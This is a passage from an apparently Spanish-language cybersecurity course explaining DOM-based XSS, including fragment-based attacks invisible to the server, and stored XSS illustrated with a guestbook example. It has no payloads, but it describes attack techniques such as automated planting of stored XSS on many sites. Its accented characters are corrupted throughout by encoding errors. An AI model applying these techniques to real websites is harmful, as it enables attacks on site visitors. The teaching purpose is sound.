En el ejemplo anterior, JavaScript no era necesario; el servidor podr√≠a haber generado todo el HTML por s√≠ solo. Si el c√≥digo del lado del servidor estuviera libre de vulnerabilidades, el sitio web estar√≠a a salvo de XSS.

Sin embargo, a medida que las aplicaciones web se vuelven m√°s avanzadas, JavaScript genera una cantidad cada vez mayor de HTML en el lado del cliente en lugar de hacerlo en el servidor. Cada vez que sea necesario cambiar el contenido sin actualizar toda la p√°gina, la actualizaci√≥n debe realizarse mediante JavaScript. En particular, este es el caso cuando una p√°gina se actualiza despu√©s de una solicitud AJAX.

Esto significa que las vulnerabilidades XSS pueden estar presentes no s√≥lo en el c√≥digo del lado del servidor de su sitio web, sino tambi√©n en el c√≥digo JavaScript del lado del cliente de su sitio web. En consecuencia, incluso con un c√≥digo del lado del servidor completamente seguro, el c√≥digo del lado del cliente a√∫n podr√≠a incluir de manera insegura la entrada del usuario en una actualizaci√≥n del DOM despu√©s de que se haya cargado la p√°gina. Si esto sucede, el c√≥digo del lado del cliente ha habilitado un ataque XSS sin que sea culpa del c√≥digo del lado del servidor.

### **XSS basado en DOM invisible para el servidor**

Existe un caso especial de XSS basado en DOM en el que, para empezar, la cadena maliciosa nunca se env√≠a al servidor del sitio web: cuando la cadena maliciosa est√° contenida en el identificador de fragmento de una URL (cualquier cosa despu√©s del car√°cter #). Los navegadores no env√≠an esta parte de la URL a los servidores, por lo que el sitio web no tiene forma de acceder a ella mediante el c√≥digo del lado del servidor. El c√≥digo del lado del cliente, sin embargo, tiene acceso a √©l y, por lo tanto, puede causar vulnerabilidades XSS si lo maneja de manera insegura.

Esta situaci√≥n no se limita a los identificadores de fragmentos. Otras entradas del usuario que son invisibles para el servidor incluyen nuevas funciones HTML5 como LocalStorage e IndexedDB.

Vulnerabilidades XSS almacenadas (o persistentes)

Un ataque XSS almacenado es mucho m√°s peligroso por dos razones.

> En primer lugar, se puede automatizar un ataque XSS almacenado. Se puede crear un script que visite miles de sitios web, explote una vulnerabilidad en cada sitio y suelte una carga √∫til XSS almacenada.

> **En segundo lugar, las v√≠ctimas de un ataque XSS almacenado no tienen que realizar ninguna otra acci√≥n que no sea visitar el sitio web afectado.** Cualquiera que visite la p√°gina afectada del sitio se convertir√° en v√≠ctima porque el c√≥digo malicioso almacenado se cargar√° en su navegador. Las v√≠ctimas no necesitan realizar ninguna acci√≥n adicional, como hacer clic en un enlace enviado por correo electr√≥nico, para verse afectadas.


Un ataque XSS almacenado ocurre cuando un atacante env√≠a datos maliciosos a un sitio web que est√° almacenado en una base de datos o alg√∫n otro mecanismo de almacenamiento. Luego, cuando otros visitantes del sitio visitan una p√°gina o una URL espec√≠fica, reciben esos datos que ejecutan y realizan alg√∫n tipo de acci√≥n maliciosa. Veamos un ejemplo:

![XSS5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/xss5.png?raw=true)

El c√≥digo anterior es una aplicaci√≥n de libro de visitas muy b√°sica. Tambi√©n es un ejemplo cl√°sico de vulnerabilidad XSS almacenada. Cuando cargue esta aplicaci√≥n, ver√° un formulario que le pedir√° que firme un libro de visitas que se ve as√≠: